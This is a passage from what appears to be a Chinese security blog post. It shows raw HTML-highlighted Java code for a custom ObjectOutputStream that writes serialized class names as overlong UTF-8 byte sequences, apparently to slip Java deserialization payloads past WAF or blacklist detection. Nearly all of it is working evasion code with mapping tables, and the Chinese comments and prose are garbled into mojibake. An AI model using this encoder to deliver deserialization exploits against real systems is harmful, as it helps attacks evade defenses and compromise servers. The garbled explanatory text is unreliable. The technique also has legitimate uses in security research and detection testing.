class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span><br>            <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">externalizable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">serializable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWriteObjectData</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEnum</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>);<br>        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>        System.out.println(name);<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br><br><br>        writeLong(desc.getSerialVersionUID());<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (externalizable) &#123;<br>            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">int</span> protocol;<br>            <span class="hljs-keyword">try</span> &#123;<br>                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                protocol = (<span class="hljs-type">int</span>) protocolField.get(<span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (serializable) &#123;<br>            flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (hasWriteObjectData) &#123;<br>            flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isEnum) &#123;<br>            flags |= ObjectStreamConstants.SC_ENUM;<br>        &#125;<br>        writeByte(flags);<br><br>        writeShort(fields.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>            writeByte(f.getTypeCode());<br>            writeUTF(f.getName());<br>            <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                invoke(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;writeTypeString&quot;</span>, f.getTypeString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object object, String methodName, Object... args)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);<br>            writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                writeTypeString.invoke(object, args);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Class&lt;?&gt; clazz = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            value = field.get(object);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ç« è¯„è®ºåŒºè¿˜æåˆ°äº†ï¼Œå¯ä»¥ç›´æ¥é‡å†™writeUTFæ–¹æ³•ä¼šæ›´åŠ ç®€å•ï¼Œä¿®æ”¹ä¸€ä¸‹å˜æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, SecurityException &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title 